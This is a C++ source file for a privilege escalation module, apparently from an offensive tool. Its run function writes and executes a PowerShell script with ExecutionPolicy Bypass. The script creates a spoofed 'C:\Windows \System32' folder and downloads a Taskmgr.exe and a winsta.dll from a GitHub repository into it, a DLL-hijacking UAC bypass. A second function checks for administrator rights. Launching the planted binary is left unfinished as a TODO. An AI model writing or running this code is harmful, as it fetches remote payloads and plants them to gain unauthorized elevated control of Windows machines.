#include "PrivilegeEscalation.h"

// This function tries to privilege escalation
const bool PrivilegeEscalation::run(void)
{
    // Create Powershell file and run
    std::string tempPath = System::getTempPath() + "\\Temp.ps1";
    std::ofstream file;
    file.open(tempPath);
    file << "New-Item \"\\\\?\\C:\\Windows \\System32\" -ItemType Directory" << std::endl;
    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe\" -outfile \"C:\\Windows \\System32\\Taskmgr.exe\"" << std::endl;
    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll\" -outfile \"C:\\Windows \\System32\\winsta.dll\"" << std::endl;
    file.close();
    std::string command = "powershell -ExecutionPolicy Bypass -F " + tempPath; // Run the powershell file
    system(command.c_str());
    remove(tempPath.c_str());

    // Checking Powershell results
    if (System::fileExist("C:\\Windows \\System32\\Taskmgr.exe") && System::fileExist("C:\\Windows \\System32\\winsta.dll"))
    {
        // TODO: Create Process - "\"C:\\Windows \\System32\\Taskmgr.exe\"" :( SO HARD
        return true;
    }
    
    return false;
}

// This function checks if the current process is run as system admin
const bool PrivilegeEscalation::systemAdminCheck(void)
{
    int exitCode = system("net session >nul 2>&1"); // This command require high-privileged user
    return !exitCode;
}
